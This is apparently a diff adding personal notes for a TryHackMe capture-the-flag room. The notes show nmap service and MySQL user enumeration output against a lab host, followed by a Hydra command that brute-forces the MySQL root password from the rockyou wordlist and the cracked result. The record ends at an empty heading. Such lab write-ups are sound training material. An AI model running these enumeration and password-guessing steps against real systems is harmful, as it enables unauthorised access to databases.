@@ -1,6 +1,94 @@
 <code>
 https://tryhackme.com/room/ettubrute
 
+## Service enumetration
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.5
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 18:5a:d4:0f:2c:ae:36:9d:35:9c:83:af:da:85:a0:75 (RSA)
+|   256 8b:72:5d:b3:75:27:26:6d:3f:a3:41:23:27:1e:cb:4e (ECDSA)
+|_  256 6f:58:b9:06:ee:97:de:5e:64:76:55:00:4d:be:47:e7 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Login
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
+| Not valid before: 2021-10-19T04:00:09
+|_Not valid after:  2031-10-17T04:00:09
+|_ssl-date: TLS randomness does not represent time
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.41-0ubuntu0.20.04.1
+|   Thread ID: 51
+|   Capabilities flags: 65535
+|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, LongPassword, SupportsCompression, FoundRows, ConnectWithDatabase, SupportsTransactions, IgnoreSigpipes, ODBCClient, SupportsLoadDataLocal, LongColumnFlag, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: 4~L\x02ed`RsB\x08q1\x01E!L1~.
+|_  Auth Plugin Name: caching_sha2_password
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+## mysql user Enumeration
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-16 11:50 CEST
+Nmap scan report for 10.10.7.238
+Host is up (0.032s latency).
+
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.20.04.1
+|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+| mysql-enum: 
+|   Valid usernames: 
+|     root:<empty> - Valid credentials
+|     netadmin:<empty> - Valid credentials
+|     guest:<empty> - Valid credentials
+|     user:<empty> - Valid credentials
+|     web:<empty> - Valid credentials
+|     sysadmin:<empty> - Valid credentials
+|     administrator:<empty> - Valid credentials
+|     webadmin:<empty> - Valid credentials
+|     admin:<empty> - Valid credentials
+|     test:<empty> - Valid credentials
+|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
+|_mysql-empty-password: ERROR: Script execution failed (use -d to debug)
+| mysql-brute: 
+|   Accounts: No valid accounts found
+|   Statistics: Performed 0 guesses in 1 seconds, average tps: 0.0
+|_  ERROR: The service seems to have failed or is heavily firewalled...
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.41-0ubuntu0.20.04.1
+|   Thread ID: 116
+|   Capabilities flags: 65535
+|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Support41Auth, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, SupportsCompression, Speaks41ProtocolNew, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, InteractiveClient, LongPassword, SupportsLoadDataLocal, FoundRows, DontAllowDatabaseTableColumn, LongColumnFlag, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x15MGc\x1AmwX\x13bw\x1BE\x0BhH\x1Buf\x19
+|_  Auth Plugin Name: caching_sha2_password
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
+
+
+## password brute force sql
+hydra -l root -P ../../www/wordlists/rockyou.txt 10.10.81.109 mysql
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-16 15:25:58
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking mysql://10.10.81.109:3306/
+[3306][mysql] host: 10.10.81.109   login: root   password: rockyou
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-16 15:26:00
+
+
+
 ## mysql Enumeration
 
 
